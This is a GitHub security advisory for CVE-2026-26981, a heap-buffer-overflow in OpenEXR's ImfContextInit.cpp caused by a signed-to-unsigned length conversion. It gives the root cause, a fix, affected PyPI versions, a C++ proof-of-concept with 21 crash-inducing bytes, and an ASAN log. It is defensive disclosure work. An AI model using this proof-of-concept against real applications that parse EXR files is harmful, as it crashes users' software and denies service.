# [M] OpenEXR has heap-buffer-overflow via signed integer underflow in ImfContextInit.cpp

## Summary
Severity: Medium
Advisory: GHSA-q6vj-wxvf-5m8c
CVE: CVE-2026-26981
CWE: CWE-195
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-06
Source: https://github.com/advisories/GHSA-q6vj-wxvf-5m8c
Type: github-advisory

## Affected
- PyPI: `OpenEXR` — affected >=3.3.0 <3.3.7
- PyPI: `OpenEXR` — affected >=3.4.0 <3.4.5

## Details
## Summary

A heap-buffer-overflow (OOB read) occurs in the `istream_nonparallel_read` function in `ImfContextInit.cpp` when parsing a malformed EXR file through a memory-mapped `IStream`. A signed integer subtraction produces a negative value that is implicitly converted to `size_t`, resulting in a massive length being passed to `memcpy`.

## Affected Version

- OpenEXR **main branch** (commit at time of testing)
- `src/lib/OpenEXR/ImfContextInit.cpp`, lines 121–136

## Root Cause

`ImfContextInit.cpp:121-126`:

```cpp
int64_t stream_sz = s->size ();           // e.g., 21 (actual file size)
int64_t nend = nread + (int64_t)sz;       // e.g., 17 + 4096 = 4113
if (stream_sz > 0 && nend > stream_sz)
{
    sz = stream_sz - nend;                // 21 - 4113 = -4092 (signed)
}
// ...
memcpy (buffer, data, sz);               // sz is size_t → wraps to 0xFFFFFFFFFFFFF004
```

`sz` is of type `size_t` (unsigned), but `stream_sz - nend` yields a negative `int64_t` value. This negative value is implicitly converted to `size_t`, wrapping around to a value close to `2^64`, which is then passed to `memcpy` causing a heap-buffer-overflow.

**Suggested fix:** `sz = stream_sz - nend` → `sz = stream_sz - nread`

## Reproduce

Build OpenEXR as static libraries with ASAN enabled, then compile the PoC below.

**PoC Code:**

```cpp
#include <cstdint>
#include <cstring>
#include <iostream>

#include <ImfMultiPartInputFile.h>
#include <ImfInputPart.h>
#include <ImfHeader.h>

OPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_ENTER

class MemMapIStream : public IStream
{
public:
    MemMapIStream (const uint8_t* data, size_t len)
        : IStream ("poc_input")
        , _data (reinterpret_cast<const char*> (data))
        , _size (static_cast<int64_t> (len))
        , _pos (0)
    {}

    bool isMemoryMapped () const override { return true; }

    bool read (char c[], int n) override
    {
        int64_t avail = (_pos < _size) ? (_size - _pos) : 0;
        int64_t copy  = (static_cast<int64_t> (n) < avail) ? n : avail;
        if (copy > 0) memcpy (c, _data + _pos, copy);
        _pos += n;
        return _pos <= _size;
    }

    char* readMemoryMapped (int n) override
    {
        if (_pos + n > _size)
            throw IEX_NAMESPACE::InputExc ("read past end");
        const char* p = _data + _pos;
        _pos += n;
        return const_cast<char*> (p);
    }

    uint64_t tellg () override { return static_cast<uint64_t> (_pos); }
    void     seekg (uint64_t pos) override { _pos = static_cast<int64_t> (pos); }

    int64_t size () override { return _size; }

private:
    const char* _data;
    int64_t     _size;
    int64_t     _pos;
};

OPENEXR_IMF_INTERNAL_NAMESPACE_HEADER_EXIT

int main ()
{
    static const uint8_t crash_data[] = {
        0x76, 0x2f, 0x31, 0x01,
        0x02, 0x06, 0x00, 0x00,
        0x74, 0x69, 0x6c, 0x65, 0x73, 0x00,
        0x20, 0x00, 0x00,
        0x53, 0x00, 0x00, 0x00
    };

    try
    {
        Imf::MemMapIStream stream (crash_data, sizeof (crash_data));
        Imf::MultiPartInputFile file (stream);
    }
    catch (const std::exception& e)
    {
        std::cout << "Exception: " << e.what () << "\n";
    }

    return 0;
}
```

**PoC Input:** https://drive.google.com/file/d/1VhjdK11LA0LHdW1mJJIQEo64mc5tpOUV/view?usp=drive_link

## ASAN Log

```
==305348==ERROR: AddressSanitizer: negative-size-param: (size=-4096)
    #0 0x62aee9fc732a in __asan_memcpy (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #1 0x62aeea0e3377 in Imf_4_0::istream_nonparallel_read(_priv_exr_context_t const*, void*, void*, unsigned long, unsigned long, int (*)(_priv_exr_context_t const*, int, char const*, ...)) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContextInit.cpp:136:21
    #2 0x62aeea15e75b in dispatch_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:51:16
    #3 0x62aeea19da19 in scratch_seq_skip /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:202:29
    #4 0x62aeea197ec9 in check_populate_tiles /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:1560:9
    #5 0x62aeea197ec9 in check_req_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2020:24
    #6 0x62aeea197ec9 in pull_attr /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2085:10
    #7 0x62aeea197ec9 in internal_exr_parse_header /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/parse_header.c:2848:18
    #8 0x62aeea15f578 in exr_start_read /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXRCore/context.c:270:49
    #9 0x62aeea0d8130 in Imf_4_0::Context::Context(char const*, Imf_4_0::ContextInitializer const&, Imf_4_0::Context::read_mode_t) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfContext.cpp:124:10
    #10 0x62aeea0633ab in Imf_4_0::MultiPartInputFile::MultiPartInputFile(char const*, Imf_4_0::ContextInitializer const&, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:59:7
    #11 0x62aeea0649de in Imf_4_0::MultiPartInputFile::MultiPartInputFile(Imf_4_0::IStream&, int, bool) /home/wjddn0623/fuzzing/openexr/src/lib/OpenEXR/ImfMultiPartInputFile.cpp:96:7
    #12 0x62aeea00d522 in fuzz_cpp_headers(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:167:31
    #13 0x62aeea00d522 in fuzz_cpp_api(char const*, unsigned long) /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:460:5
    #14 0x62aeea00a156 in LLVMFuzzerTestOneInput /home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer.cc:927:5
    #15 0x62aee9f15414 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187414) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #16 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #17 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #18 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #19 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #20 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #21 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)

0x503000000235 is located 0 bytes after 21-byte region [0x503000000220,0x503000000235)
allocated by thread T0 here:
    #0 0x62aeea007c61 in operator new[](unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x279c61) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #1 0x62aee9f15325 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x187325) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #2 0x62aee9efe546 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x170546) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #3 0x62aee9f03ffa in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x175ffa) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #4 0x62aee9f2e7b6 in main (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x1a07b6) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)
    #5 0x71035ee2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #6 0x71035ee2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #7 0x62aee9ef9114 in _start (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x16b114) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0)

SUMMARY: AddressSanitizer: negative-size-param (/home/wjddn0623/fuzzing/openexr/exr_decode_fuzzer+0x23932a) (BuildId: c02729e73015cfda2879d44b5d5b25d4b5e68ae0) in __asan_memcpy
==305348==ABORTING
```

## Impact

- **DoS** — Any application that opens a crafted EXR file will crash immediately
- **CWE-195** (Signed to Unsigned Conversion Error) → **CWE-122** (Heap-based Buffer Overflow)
- Affects any application using an `IStream` implementation where `isMemoryMapped()` returns `true`

## References
- https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-q6vj-wxvf-5m8c
- https://nvd.nist.gov/vuln/detail/CVE-2026-26981
- https://github.com/AcademySoftwareFoundation/openexr/commit/6bb2ddf1068573d073edf81270a015b38cc05cef
- https://github.com/AcademySoftwareFoundation/openexr/commit/d2be382758adc3e9ab83a3de35138ec28d93ebd8
- https://github.com/AcademySoftwareFoundation/openexr
